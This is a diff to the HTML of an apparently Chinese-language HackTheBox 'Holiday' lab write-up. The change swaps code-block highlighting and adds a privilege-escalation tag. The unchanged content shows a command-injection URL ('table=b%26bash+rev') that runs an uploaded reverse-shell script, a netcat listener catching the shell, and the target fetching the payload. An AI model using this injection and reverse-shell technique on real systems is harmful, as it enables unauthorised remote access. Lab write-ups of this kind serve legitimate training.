@@ -542,22 +542,22 @@ listening on [any] 2333 ...
 
 <p>并且web服务器也收到信号</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - <span class="o">[</span>18/Apr/2023 22:05:48] <span class="s2">"GET /rev HTTP/1.1"</span> 200 -
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>::ffff:10.10.10.25 - - [18/Apr/2023 22:05:48] "GET /rev HTTP/1.1" 200 -
 </code></pre></div></div>
 <p>通过ls命令可以看到rev文件上传成功了，因为网有点卡我多点了几次，所以有重复的文件，但是我们只需要看rev就行了
 <img src="/images/hackthebox/holiday/13.png" alt="" /></p>
 
 <p>访问<code class="language-plaintext highlighter-rouge">/admin/export?table=b%26bash+rev</code>执行反弹shell命令，成功得到了webshell</p>
 
-<div class="language-shell highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:<span class="se">\U</span>sers<span class="se">\1</span>4530&gt;nc <span class="nt">-lnvp</span> 2333
-listening on <span class="o">[</span>any] 2333 ...
-connect to <span class="o">[</span>10.10.14.2] from <span class="o">(</span>UNKNOWN<span class="o">)</span> <span class="o">[</span>10.10.10.25] 46894
-bash: cannot <span class="nb">set </span>terminal process group <span class="o">(</span>1137<span class="o">)</span>: Inappropriate ioctl <span class="k">for </span>device
-bash: no job control <span class="k">in </span>this shell
-algernon@holiday:~/app<span class="nv">$ </span><span class="nb">whoami
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Users\14530&gt;nc -lnvp 2333
+listening on [any] 2333 ...
+connect to [10.10.14.2] from (UNKNOWN) [10.10.10.25] 46894
+bash: cannot set terminal process group (1137): Inappropriate ioctl for device
+bash: no job control in this shell
+algernon@holiday:~/app$ whoami
 whoami
-</span>algernon
-algernon@holiday:~/app<span class="err">$</span>
+algernon
+algernon@holiday:~/app$
 </code></pre></div></div>
 
 <p>成功拿到第一个flag</p>
@@ -670,6 +670,8 @@ root@holiday:/root# <span class="nb">cat </span>root.txt
       <a href="/tags/#linux" class="page__taxonomy-item" rel="tag">linux</a><span class="sep">, </span>
     
       <a href="/tags/#node" class="page__taxonomy-item" rel="tag">node</a><span class="sep">, </span>
+    
+      <a href="/tags/#privilege-escalation" class="page__taxonomy-item" rel="tag">privilege-escalation</a><span class="sep">, </span>
     
       <a href="/tags/#rce" class="page__taxonomy-item" rel="tag">rce</a><span class="sep">, </span>
     
